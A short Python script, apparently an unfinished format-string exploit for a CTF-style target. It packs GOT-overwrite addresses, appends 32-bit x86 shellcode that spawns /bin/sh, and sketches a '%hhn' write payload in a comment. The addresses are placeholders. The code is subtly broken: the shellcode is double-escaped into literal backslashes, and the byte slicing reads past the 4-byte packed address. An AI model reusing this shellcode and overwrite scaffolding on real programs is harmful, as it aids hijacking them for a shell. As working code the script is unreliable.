import sys
import struct
from subprocess import Popen

# addr = 0xbffff6f8
addr_got = 0x000000ff
addr_buf = 0x3456ff88

# shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
shellcode = "\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80"


# print('%d' % int('0x000000ff', 16))
offset = 7
# print("addr_got:%d, addr_buf:%d, offset:%d" % (addr_got, addr_buf, offset))

buf = ''
for i in range(4):
    tmp_addr_got = addr_got + i
    hex_str = format(tmp_addr_got, '08x')
    for j in range(4):
        idx = 8-2*(j+1)
        buf += '\\x' + hex_str[idx] + hex_str[idx + 1]

# print(buf)
buf += shellcode
# print(buf)

slide_addr_buf = addr_buf + 16
lit_addr_buf = struct.pack('<I', slide_addr_buf)
print("lit_addr_buf:%s" % lit_addr_buf)
print(lit_addr_buf[:2])
print(lit_addr_buf[2:4])
print(lit_addr_buf[4:6])
print(lit_addr_buf[6:8])


# a = list(map(ord, b))
# print(a)

# buf = "%%%dc%%%d$hhn" % (a[0], 1)
# print(buf)